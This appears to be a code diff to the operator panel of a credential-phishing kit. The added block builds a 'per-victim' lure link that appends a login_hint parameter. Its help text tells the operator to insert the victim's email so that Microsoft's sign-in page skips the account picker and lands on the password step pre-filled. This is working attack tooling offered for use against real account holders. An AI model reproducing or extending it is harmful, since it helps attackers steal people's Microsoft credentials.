@@ -444,6 +444,13 @@ function mgEditLure(l) {
     s('login_prompt', 'login_prompt', l.login_prompt,
       [['', 'inherit global'], ['login', 'login - always ask'], ['select_account', 'select_account - account picker'], ['off', 'off - never prompt']],
       'empty = use the global setting; returning-visitor lures want select_account') +
+    (function () {
+      var link = l.link || '';
+      var tpl = link + (link.indexOf('?') >= 0 ? '&' : '?') + 'login_hint={email}';
+      return '<div class="field"><label>Per-victim link (login_hint)</label>' +
+        '<span class="mono copy" data-act="copy" data-copy="' + esc(tpl) + '">' + esc(tpl) + ' &#10697;</span>' +
+        '<span class="hint">Replace {email} with the victim address. Microsoft names the account, so it jumps to the password step with the address pre-filled - even on a browser that has never seen this domain (no account picker needed).</span></div>';
+    })() +
     f('info', 'info', l.info) + f('active_hours', 'active_hours', l.active_hours, 'HH:MM-HH:MM') +
     f('active_days', 'active_days', l.active_days, 'Mon,Tue,…') + f('active_tz', 'active_tz', l.active_tz, 'IANA tz') +
     f('og_title', 'og_title', l.og_title) + f('og_desc', 'og_desc', l.og_desc) +
